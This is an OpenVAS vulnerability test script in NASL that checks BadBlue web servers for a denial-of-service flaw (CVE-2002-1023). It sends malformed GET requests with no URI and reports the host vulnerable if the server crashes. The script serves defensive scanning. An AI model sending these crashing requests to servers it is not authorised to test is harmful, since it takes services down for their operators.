# OpenVAS Vulnerability Test
# $Id: badblue_get_DoS.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: BadBlue invalid GET DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11062");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(5187);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2002-1023");
  script_name("BadBlue invalid GET DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("BadBlue/banner");

  script_tag(name:"summary", value:"It was possible to kill the web server by
  sending an invalid GET request (without any URI)");

  script_tag(name:"impact", value:"An attacker may exploit this vulnerability to make your web server
  crash continually.");

  script_tag(name:"solution", value:"Upgrade your software or protect it with a filtering reverse proxy.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);
if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(! soc)
  exit(0);

r1 = string("GET HTTP/1.0\r\n", "Host: ", get_host_ip(), "\r\n\r\n");
send(socket:soc, data:r1);
http_recv(socket:soc);
close(soc);

sleep(1);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

soc = http_open_socket(port);
if(!soc)
  exit(0);

r2 = string("GET  HTTP/1.0\r\n", "Host: ", get_host_ip(), "\r\n\r\n");
send(socket:soc, data:r2);
http_recv(socket:soc);
http_close_socket(soc);

sleep(1);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);